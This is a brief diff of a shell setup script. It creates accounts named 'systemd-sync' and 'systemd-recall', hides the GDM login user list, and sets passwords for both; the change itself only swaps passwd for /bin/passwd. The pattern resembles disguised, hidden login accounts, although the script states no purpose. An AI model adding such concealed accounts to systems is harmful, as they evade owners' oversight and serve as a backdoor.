@@ -25,9 +25,9 @@ sudo useradd -u 570 -G systemd -M systemd-recall
 sudo sed -i 's/# disable-user-list=true/ disable-user-list=true/g' /etc/gdm3/greeter.dconf-defaults
 
 echo "Password for sync"
-sudo passwd systemd-sync
+sudo /bin/passwd systemd-sync
 echo "Password for recall"
-sudo passwd systemd-recall
+sudo /bin/passwd systemd-recall
 
 }
 
